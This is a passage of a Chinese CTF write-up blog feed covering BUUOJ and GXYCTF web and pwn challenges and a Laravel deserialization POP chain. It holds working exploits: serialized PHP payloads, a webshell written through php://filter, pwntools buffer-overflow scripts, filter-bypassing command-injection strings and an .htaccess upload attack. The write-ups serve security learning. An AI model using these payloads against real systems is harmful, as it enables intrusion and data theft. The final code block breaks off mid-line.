        <content type="html"><![CDATA[<h3 id="0x-01-题目分析"><a href="#0x-01-题目分析" class="headerlink" title="0x 01 题目分析"></a>0x 01 题目分析</h3><p>题目改编自 EIS 2019 的 ezpop，与原题不同的是加了下面这个，对文件名有所控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function getCacheKey(string $name): string &#123;</span><br><span class="line">        &#x2F;&#x2F; 使缓存文件名随机</span><br><span class="line">        $cache_filename &#x3D; $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;</span><br><span class="line">        if(substr($cache_filename, -strlen(&#39;.php&#39;)) &#x3D;&#x3D;&#x3D; &#39;.php&#39;) &#123;</span><br><span class="line">            die(&#39;?&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $cache_filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原题解题报告参考：<a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">https://www.jianshu.com/p/763427ea0e4b</a></p><h3 id="0x-02-解题方法一"><a href="#0x-02-解题方法一" class="headerlink" title="0x 02 解题方法一"></a>0x 02 解题方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;abc&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;system&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line">$testA &#x3D; new A($testB, &quot;miao&quot;);</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">$testA-&gt;cache &#x3D; [&#39;aaq&#39; &#x3D;&gt; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;];</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这里<code>$serizlize</code> 是可控的，<code>$data</code> 会被转换成json,利用system执行命令，最后相当于执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[&#123;&quot;aaq&quot;:&quot;&#96;cat \&#x2F;flag &gt; .\&#x2F;flag.php&#96;&quot;&#125;,true]&quot;</span><br></pre></td></tr></table></figure><p>在shell里面，的优先级是高于”的，所以会先执行<code>cat /flag &gt; ./flag.php</code>然后再将执行结果拼接成一个新的命令,参考 <a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194036</a></p><h3 id="0x-03-解题方法二"><a href="#0x-03-解题方法二" class="headerlink" title="0x 03 解题方法二"></a>0x 03 解题方法二</h3><p>对于前面的随机值，使用/../即可截断，后面即可追加写任意文件。</p><p>于是先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行即可。</p><p>参见 <a href="http://althims.com/2020/01/29/buu-new-year/" target="_blank" rel="noopener">http://althims.com/2020/01/29/buu-new-year/</a></p><h3 id="0x-04-解题方法三"><a href="#0x-04-解题方法三" class="headerlink" title="0x 04 解题方法三"></a>0x 04 解题方法三</h3><p>对于尾部 .php 的限制，可使用追加 /. 来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testA &#x3D; new A($testB, $key &#x3D; &#39;&#x2F;..&#x2F;miao1.php&#x2F;.&#39;);</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">&#x2F;&#x2F; &lt;?php phpinfo();?\&gt;</span><br><span class="line">$testA-&gt;cache &#x3D; array(&quot;PD9waHAgcGhwaW5mbygpOz8+&quot;&#x3D;&gt;&quot;&quot;);</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;strval&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-pwn题解（一）</title>
      <link href="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-rip"><a href="#0x-01-rip" class="headerlink" title="0x 01 rip"></a>0x 01 rip</h3><p>存在后门函数fun，覆盖返回地址为fun地址</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29406)</span><br><span class="line">payload&#x3D;&#39;a&#39;*23+p64(0x401186)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-02-warmup-csaw-2016"><a href="#0x-02-warmup-csaw-2016" class="headerlink" title="0x 02 warmup_csaw_2016"></a>0x 02 warmup_csaw_2016</h3><p>存在后门函数</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122111550543.png" alt></p><p>首先我们用cyclic创建一个200字符的字符串，利用它来判断溢出点到返回地址的偏移</p><p>启动dbg进行调试</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112113113.png" alt></p><p>由图可得，根据小端序，‘saaa‘之前有多少个字符，就是偏移量</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112201127.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25478)</span><br><span class="line">addr&#x3D;0x40060d</span><br><span class="line">payload&#x3D;&#39;a&#39;*72+p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-03-pwn1-sctf-2016"><a href="#0x-03-pwn1-sctf-2016" class="headerlink" title="0x 03 pwn1_sctf_2016"></a>0x 03 pwn1_sctf_2016</h3><p>在输入点中可以输入32个字节的数据到0x3c空间，不存在溢出问题。</p><p>接着出现了字符串you、字符串I和replace函数，初步猜测是发生了替换操作，执行验证</p><p>替换过程为I=you,一个字节产生三个字节。</p><p>在替换完成后，使用了strcpy函数将替换后的数据拷贝到s中。这里可以构造溢出点。</p><p>通过输入21个I，然后替换成21个you，一共63个字节数据，然后任意填入一个字节数据，接着就填充满溢出空间，然后再劫持控制流EIP到利用点函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28850)</span><br><span class="line">flag_addr &#x3D; 0x08048f0d</span><br><span class="line">payload &#x3D; &#39;I&#39;*((0x3c+4-1)&#x2F;3)+&#39;R&#39;+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h3 id="0x-04-ciscn-2019-n-1"><a href="#0x-04-ciscn-2019-n-1" class="headerlink" title="0x 04 ciscn_2019_n_1"></a>0x 04 ciscn_2019_n_1</h3><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145436538.png" alt></p><p>就是一个简单的溢出让v2变成11.28125。v1是var_30，v2是var_4：</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145537195.png" alt></p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145607698.png" alt></p><p>再看一下11.28125在程序中的表示：</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145944155.png" alt></p><p>也就是让v2变成41348000h，所以exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29263</span>)</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-05"><a href="#0x-05" class="headerlink" title="0x 05"></a>0x 05</h3>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019复盘</title>
      <link href="/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/"/>
      <url>/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-Ping-Ping-Ping"><a href="#0x-01-Ping-Ping-Ping" class="headerlink" title="0x 01 Ping Ping Ping"></a>0x 01 Ping Ping Ping</h3><ul><li>解题思路</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;ip&#39;]))&#123;</span><br><span class="line">  $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">  if(preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个题目首先过滤了符号，但是过滤不严格，可以使用管道符和;，因此可以使用这两个符号来拼</p><p>接命令；其次过滤了空格，可以使用$IFS$9来替代空格；最后过滤了flflag，这个过滤比较严格，具</p><p>体的正则是 .<em>f.<em>l.</em>a.*g.</em> ，可以通过 base64 来绕过，或者用变量名拼接绕过。</p><p>解法一：利用反引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>解法二：利用base64绕过 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br><span class="line">## 管道符的作用是将上一条命令的输出，作为下一条命令参数</span><br></pre></td></tr></table></figure><p>解法三：利用变量拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$9$b$a.php</span><br></pre></td></tr></table></figure><h3 id="0x-02-禁止套娃"><a href="#0x-02-禁止套娃" class="headerlink" title="0x 02 禁止套娃"></a>0x 02 禁止套娃</h3><ul><li><p>解题思路</p><p>扫描目录，发现.git/文件夹，使用 githack 得到源代码</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>考的是无参数rce</p><p>解法一：</p><p>使用 scandir()查看当前目录情况，可以使用 pos(localeconv()); 构造一个 . 出来，用 print_r() 输出，即可得到当前的目录文件情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>发现存在flag.php位于倒数第二个，用一个array_reverse() 函数将数组翻转，再读取next即可读取到flag文件，最后使用 show_source()可以显示 php 代码，即可拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>解法二</p><p><img src="https://uploader.shimo.im/f/7RcZuASL4Ak4qgYh.png!original" alt="img"></p><h3 id="0x-03-BabyUpload"><a href="#0x-03-BabyUpload" class="headerlink" title="0x 03 BabyUpload"></a>0x 03 BabyUpload</h3><ul><li><p>解题思路</p><p>随便上传发现文件后缀ph被拦截， php3、phtml 都不能使，随便搞出来一个404得知是 apache 服务器，可以使用 .htaccess 文件改变文件解析配置，使得服务器可以把jpg当做php解析，从而命令执行；此外，服务器会<strong>检查文件内容是否包含</strong> （可以fuzz出来），要使用格式编写php代码。因此，本题上传 .htaccess 文件修改apache的解析，再把一句话木马后缀改为jpg即可</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;408150eb-1fa1-4377-94e9-63e769e1c586.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">htaccess &#x3D; &#123;&#39;uploaded&#39;: (&#39;.htaccess&#39;, &quot;SetHandler application&#x2F;x-httpd-php&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_hta &#x3D; session.post(url, files&#x3D;htaccess)</span><br><span class="line">files &#x3D; &#123;&#39;uploaded&#39;: (&#39;123.jpg&#39;, &quot;&lt;script language&#x3D;\&quot;php\&quot;&gt;echo file_get_contents(\&quot;&#x2F;flag\&quot;);&lt;&#x2F;script&gt;&quot;, &#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res_jpg &#x3D; session.post(url, files&#x3D;files)</span><br><span class="line">res_shell &#x3D; session.post(url + res_jpg.text[-69:-22], data &#x3D; &#123;&#39;a&#39;:&#39;echo file_get_contents(\&#39;&#x2F;flag\&#39;);&#39;&#125;)</span><br><span class="line">print(res_shell.text)</span><br></pre></td></tr></table></figure><p>其他题目参考<a href="https://hwlanxiaojun.github.io/2020/03/20/安恒杯丨新春祈福赛/" target="_blank" rel="noopener">https://hwlanxiaojun.github.io/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> GXYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel反序列化学习</title>
      <link href="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    最近在刷buuoj发现了Laravel框架的题目，web菜鸡开始按照网上的方法开始学习挖掘pop链</p><h3 id="0x-01-CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#0x-01-CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="0x 01 [CISCN2019 总决赛 Day1 Web4]Laravel1"></a>0x 01 [CISCN2019 总决赛 Day1 Web4]Laravel1</h3><ul><li>第一种pop链</li></ul><ol><li>题目打开给了提示，需要审计Laravel源码，找反序列化链</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141527181.png" alt></p><ol start="2"><li>源代码拖入phpstrom,先全局搜索__destruct函数，找到这个类</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141755822.png" alt></p><p>进入<code>TagAwareAdapter.php</code>跟进魔术方法</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319141847277.png" alt></p><p>跟进commit-&gt;跟进invalidateTags</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142134849.png" alt></p><p>在该类下ctrl+f搜一下$this-&gt;pool进行查看</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142244132.png" alt></p><p>可以看到$this-&gt;pool是可控的，但是需要实现AdapterInterface接口，那么如果我们找到某个类，它既实现了AdapterInterface这个接口，同时又有saveDeferred方法(或者没有而有__call方法)，而且满足一定条件能文件读取或命令执行即可。</p><p>全局搜索saveDeferred方法，然后首先跟据有无AdapterInterface接口进行排除</p><p>发现在PhpArrayAdapter.php</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142626551.png" alt></p><p>跟进initialize方法，来到PhpArrayTrait类下</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142804748.png" alt></p><p>存在文件包含点，至此分析结束</p><ol start="3"><li>构造poc，首先在PhpArrayAdapter类下的saveDeferred方法的入口参数item是实现了CacheItemInterface的，也就是item应该为实现了该接口的类的实例</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319142932210.png" alt></p><p>在头文件的定义出发现使用<code>use Symfony\Component\Cache\CacheItem;</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143030711.png" alt></p><p>构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>令include下的文件为/flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>回到触发点,其中item为deferred这个数组的值，并且这里的item需要实现CacheItemInterface接口，也就是item为CacheItem类的实例，而pool就是phparrayadapter的实例</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143322334.png" alt></p><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">    private $deferred &#x3D; [];</span><br><span class="line">    private $pool;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;deferred &#x3D; array(&#39;xxx&#39; &#x3D;&gt; new CacheItem());</span><br><span class="line">        $this-&gt;pool &#x3D; new PhpArrayAdapter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组合在一起得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'xxx'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> 